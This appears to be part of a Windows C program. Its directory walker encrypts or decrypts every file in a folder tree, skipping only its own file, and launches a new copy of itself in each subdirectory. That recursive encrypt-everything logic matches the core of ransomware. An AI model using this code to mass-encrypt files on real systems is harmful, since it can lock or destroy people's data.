#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include "airf.h"

void iterate_dir(char *op, char *execp) {

	WIN32_FIND_DATA wd;
	HANDLE winhandle;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char *namebuf;
	int n;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if ((winhandle = FindFirstFile("*", &wd)) == INVALID_HANDLE_VALUE) {
		perror("findfirstfile err");
		exit(EXIT_FAILURE);
	}
	while (FindNextFile(winhandle, &wd) > 0) {
		if ((namebuf = malloc(sizeof(char) * (strlen(wd.cFileName) + 1))) == NULL) {
			perror("malloc err");
			exit(EXIT_FAILURE);
		}
		for (n = 0; n < strlen(wd.cFileName); n++)
			*(namebuf + n) = *(wd.cFileName + n);
		*(namebuf + n) = '\0';
			
		//IF A DIRECTORY IS ENCOUNTERED, SPAWN A NEW PROCESS THAT HANDLES IT
		if (wd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (strcmp(".", namebuf) != 0 && strcmp("..", namebuf) != 0) {
				if (!CreateProcess(	NULL, 
							execp, 
							NULL, 
							NULL, 
							FALSE, 
							CREATE_NEW_CONSOLE, 
							NULL, 
							wd.cFileName,
							&si,
							&pi     )) 
				{
					fprintf(stderr, "createproc err %d\n", GetLastError());
					exit(EXIT_FAILURE);
				}
				printf("Process %d moving to %s.\n", pi.dwProcessId, wd.cFileName);
			}
		} else if (strcmp(THISNAME, namebuf) == 0) {
			//stupid bitwise
		} else {
			if (strcmp("-e", op) == 0)
				fencrypt(wd.cFileName);
			else if (strcmp("-d", op) == 0)
				fdecrypt(wd.cFileName);
			else {
				printf("%s\n", "Invalid program argument.");
				exit(EXIT_FAILURE);
			}
		}
		free(namebuf);
	}
	if (GetLastError() != ERROR_NO_MORE_FILES) {
		perror("FindNextFile error.");
		exit(EXIT_FAILURE);
	}
		

}
